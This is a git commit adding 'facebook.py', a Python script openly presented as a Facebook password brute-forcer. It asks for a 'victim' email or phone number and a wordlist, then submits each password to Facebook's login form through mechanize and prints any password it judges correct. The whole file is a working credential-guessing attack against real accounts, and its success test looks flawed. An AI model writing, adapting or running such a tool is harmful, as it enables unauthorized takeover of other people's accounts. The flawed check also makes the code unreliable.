c8818103cef6e08af16469dda849aba2ef53b4e1
ahmadbrainworks <46571840+ahmadbrainworks@users.noreply.github.com>
2019-03-20 19:09:25 +0100

    Add files via upload

---
+++ facebook.py
@@ -0,0 +1,134 @@
+#!usr/bin/python
+
+
+
+import sys
+import random
+import mechanize
+import cookielib
+import itertools
+from collections import Counter
+from datetime import datetime
+import os.path
+import colorama
+import termcolor
+from colorama import init 
+from colorama import Fore, Back, Style 
+from termcolor import colored 
+  
+init() 
+
+print (Fore.GREEN +"                 _                _     ")    
+print ("                 | |              | |      ")  
+print ("                 | |__  _ __ _   _| |_ ___   ")
+print ("                 | '_ \| '__| | | | __/ _ \  ")
+print ("                 | |_) | |  | |_| | ||  __/  ")
+print ("                 |_.__/|_|   \__,_|\__\___|  ")
+print ("                 __                        ")
+print ("                / _|                       ")
+print ("               | |_ ___  _ __ ___ ___ _ __ ")
+print ("               |  _/ _ \| '__/ __/ _ \ '__|  ")
+print ("               | || (_) | | | (_|  __/ |   ")
+print ("               |_| \___/|_|  \___\___|_|   ")
+print (" \n ")
+print (Fore.YELLOW + "                 facebook.py For BruteFORCER")
+print (Fore.WHITE +  "                 Coded by: Ahmadbrainworks")
+print ("                  Website: https://jaridarfasaha.com.ng")
+print ("   Special Thanks to: Abushuraim and Arewa Wap/Web Masters")
+                             
+print ("\n ")         
+
+
+print (Fore.RED + "Place your wordlist file in facebook.py directory")
+print ("--> CTRL+C to TERMINATE")
+
+#if(Fullscreen==true)
+#execute=2*x
+
+email = str(raw_input("--> Username/Email/Phone No.: "))
+passwordlist = str(raw_input("--> Wordlist : "))
+
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+def attack(password):
+
+  try:
+     sys.stdout.write("\r-->   Trying %s.. " % password)
+     sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form(nr=0)
+
+      
+         
+           
+         
+     ##Facebook
+     br.form['email'] =email
+     br.form['pass'] = password
+     br.submit()
+     log = br.geturl()
+     if log == login:
+        print "\n\n\n --> Password found .. !!"
+        print "\n --> Password : %s\n" % (password)
+        sys.exit(1)
+  except KeyboardInterrupt:
+        print "\n[*] Exiting program .. "
+        sys.exit(1)
+
+def search():
+    global password
+    for password in passwords:
+        attack(password.replace("\n",""))
+
+
+
+def check():
+
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n--> Exiting program ..\n"
+       sys.exit(1)
+    try:
+       list = open(passwordlist, "r")
+       passwords = list.readlines()
+       k = 0
+       while k < len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n --> Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n --> Exiting program ..\n"
+        sys.exit(1)
+    try:
+        
+        print " --> Victim  : %s" % (email)
+        print " --> Total no of password in the wordlist:" , len(passwords), "passwords"
+        print " --> Bruteforce started ..."
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n --> Exiting program ..\n"
+        sys.exit(1)
+
+if __name__ == '__main__':
+    check()
